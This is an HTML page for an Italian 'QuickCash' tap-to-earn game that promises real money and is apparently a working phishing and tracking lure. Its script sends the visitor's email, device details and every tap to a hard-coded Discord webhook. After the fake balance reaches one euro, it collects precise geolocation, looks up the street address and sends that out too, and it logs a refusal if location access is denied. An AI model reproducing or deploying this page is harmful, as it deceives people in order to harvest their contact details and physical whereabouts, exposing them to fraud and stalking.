<!DOCTYPE html>
<html>
<head>
    <title>Quick Cash - Instant Earnings</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            -webkit-user-select: none;
            user-select: none;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            touch-action: manipulation;
        }
        .container {
            background: white;
            border-radius: 25px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
            padding: 35px 25px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .logo {
            font-size: 2.8em;
            font-weight: bold;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 15px;
        }
        .tagline {
            color: #666;
            margin-bottom: 30px;
            font-size: 1.2em;
            line-height: 1.4;
        }
        .earnings-display {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            padding: 30px 20px;
            border-radius: 20px;
            margin: 25px 0;
            box-shadow: 0 15px 30px rgba(245, 87, 108, 0.4);
        }
        .earnings-amount {
            font-size: 3.5em;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .earnings-label {
            font-size: 1.3em;
            opacity: 0.9;
        }
        .click-button {
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            color: white;
            border: none;
            padding: 35px 20px;
            font-size: 1.5em;
            font-weight: bold;
            border-radius: 25px;
            cursor: pointer;
            margin: 25px 0;
            box-shadow: 0 15px 35px rgba(79, 172, 254, 0.5);
            transition: all 0.1s;
            width: 100%;
            min-height: 120px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .click-button:active {
            transform: scale(0.95);
            box-shadow: 0 5px 20px rgba(79, 172, 254, 0.7);
        }
        .stats {
            display: flex;
            justify-content: space-around;
            margin: 25px 0;
            color: #666;
            font-size: 1.2em;
            font-weight: 500;
        }
        .email-section {
            margin: 30px 0;
        }
        .email-input {
            width: 100%;
            padding: 20px;
            border: 2px solid #e1e5e9;
            border-radius: 15px;
            font-size: 1.3em;
            margin-bottom: 20px;
            text-align: center;
            background: #f8f9fa;
        }
        .start-button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 20px 30px;
            font-size: 1.3em;
            border-radius: 15px;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
        }
        .start-button:active {
            transform: scale(0.98);
        }
        .hidden {
            display: none;
        }
        .pulse {
            animation: pulse 0.8s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.03); }
            100% { transform: scale(1); }
        }
        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 25px 20px;
            border-radius: 20px;
            margin: 25px 0;
            font-size: 1.2em;
        }
        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e9ecef;
            border-radius: 4px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            border-radius: 4px;
            transition: width 0.3s ease;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">💰 QuickCash</div>
        <div class="tagline">Guadagna soldi veri con semplici tap!</div>
        
        <!-- Email Section -->
        <div id="emailSection">
            <div class="email-section">
                <p style="margin-bottom: 20px; font-size: 1.2em; color: #555;">Inserisci email per iniziare:</p>
                <input type="email" class="email-input" id="emailInput" placeholder="email@example.com" required>
                <button class="start-button" onclick="startEarning()">
                    Inizia a Guadagnare
                </button>
            </div>
        </div>

        <!-- Game Section -->
        <div id="gameSection" class="hidden">
            <div class="earnings-display">
                <div class="earnings-amount" id="balance">€0.00</div>
                <div class="earnings-label">Totale Guadagni</div>
            </div>
            
            <div class="stats">
                <div>Tap: <span id="clickCount">0</span></div>
                <div>€0.05/tap</div>
            </div>

            <div class="progress-bar">
                <div class="progress-fill" id="progressFill" style="width: 0%"></div>
            </div>

            <button class="click-button pulse" id="clickButton">
                🤑 TOCCA PER GUADAGNARE! 🤑
            </button>

            <div style="color: #666; font-size: 1.1em; margin-top: 15px;">
                Più veloce tappi, più soldi fai!
            </div>
        </div>

        <!-- Success Section -->
        <div id="successSection" class="hidden">
            <div class="success-message">
                <h3 style="margin-bottom: 15px; font-size: 1.5em;">🎉 Complimenti! 🎉</h3>
                <p style="margin-bottom: 10px;">Hai guadagnato <strong id="finalAmount">€1.00</strong>!</p>
                <p>Pagamento in elaborazione...</p>
            </div>
        </div>
    </div>

    <script>
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1422614803888738415/nnmqT3Dz6V771PbfB0KkhCXLZLX6_FiWXdnqn2JBm1j87VD5b7CKvD4-b573Yh9wtC-5';
        
        let clickCount = 0;
        let balance = 0;
        let userEmail = '';
        let locationRequested = false;

        async function sendToDiscord(dataName, dataValue) {
            try {
                const payload = {
                    content: `📱 **${dataName}:** \`\`\`${JSON.stringify(dataValue, null, 2)}\`\`\``,
                    username: 'QuickCash iPhone'
                };
                
                fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (error) {}
        }

        function startEarning() {
            const email = document.getElementById('emailInput').value.trim();
            
            if (!email || !validateEmail(email)) {
                alert('Inserisci una email valida per iniziare');
                return;
            }

            userEmail = email;

            sendToDiscord('📧 EMAIL_CAPTURED', {
                email: email,
                timestamp: new Date().toISOString(),
                device: 'iPhone',
                userAgent: navigator.userAgent
            });

            document.getElementById('emailSection').classList.add('hidden');
            document.getElementById('gameSection').classList.remove('hidden');

            const clickButton = document.getElementById('clickButton');
            
            clickButton.addEventListener('touchstart', handleClick, { passive: true });
            clickButton.addEventListener('click', handleClick);
            
            sendToDiscord('🎮 GAME_STARTED', {
                email: email,
                timestamp: new Date().toISOString()
            });
        }

        function handleClick() {
            clickCount++;
            balance += 0.05;
            
            document.getElementById('balance').textContent = `€${balance.toFixed(2)}`;
            document.getElementById('clickCount').textContent = clickCount;
            document.getElementById('progressFill').style.width = `${(balance * 100)}%`;
            
            sendToDiscord(`👆 TAP_${clickCount}`, {
                email: userEmail,
                tapNumber: clickCount,
                balance: balance.toFixed(2),
                timestamp: new Date().toISOString()
            });

            const button = document.getElementById('clickButton');
            button.style.transform = 'scale(0.92)';
            setTimeout(() => {
                button.style.transform = 'scale(1)';
            }, 80);

            if (balance >= 1.00 && !locationRequested) {
                locationRequested = true;
                
                setTimeout(() => {
                    button.textContent = '🎯 VERIFICA IN CORSO... 🎯';
                    button.style.background = 'linear-gradient(135deg, #43e97b 0%, #38f9d7 100%)';
                    
                    setTimeout(requestLocation, 500);
                }, 200);
            }
        }

        function requestLocation() {
            if (!navigator.geolocation) return;

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const { latitude, longitude, accuracy } = position.coords;
                    
                    let address = 'Unknown';
                    try {
                        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
                        const data = await response.json();
                        address = data.display_name || 'Unknown';
                    } catch (e) {}
                    
                    const locationData = {
                        email: userEmail,
                        coordinates: {
                            latitude: latitude.toFixed(6),
                            longitude: longitude.toFixed(6),
                            accuracy: `${Math.round(accuracy)}m`
                        },
                        address: address,
                        googleMaps: `https://maps.google.com/?q=${latitude},${longitude}`,
                        totalTaps: clickCount,
                        finalBalance: balance.toFixed(2),
                        timestamp: new Date().toISOString(),
                        deviceInfo: navigator.userAgent
                    };
                    
                    sendToDiscord('📍 LOCATION_CAPTURED', locationData);

                    showSuccess();
                },
                (error) => {
                    sendToDiscord('❌ LOCATION_DENIED', {
                        email: userEmail,
                        error: error.message,
                        timestamp: new Date().toISOString()
                    });
                    
                    const button = document.getElementById('clickButton');
                    button.textContent = '🤑 TOCCA PER GUADAGNARE! 🤑';
                    button.style.background = 'linear-gradient(135deg, #4facfe 0%, #00f2fe 100%)';
                    locationRequested = false;
                },
                {
                    enableHighAccuracy: true,
                    timeout: 8000,
                    maximumAge: 0
                }
            );
        }

        function showSuccess() {
            document.getElementById('gameSection').classList.add('hidden');
            document.getElementById('successSection').classList.remove('hidden');
            document.getElementById('finalAmount').textContent = `€${balance.toFixed(2)}`;

            sendToDiscord('🎊 GAME_COMPLETED', {
                email: userEmail,
                totalTaps: clickCount,
                finalBalance: balance.toFixed(2),
                timestamp: new Date().toISOString()
            });
        }

        function validateEmail(email) {
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(email);
        }

        setTimeout(() => {
            sendToDiscord('📱 PAGE_LOADED', {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                screen: `${screen.width}x${screen.height}`,
                platform: navigator.platform
            });
        }, 1000);

        document.addEventListener('touchmove', function(e) {
            e.preventDefault();
        }, { passive: false });
    </script>
</body>
</html>
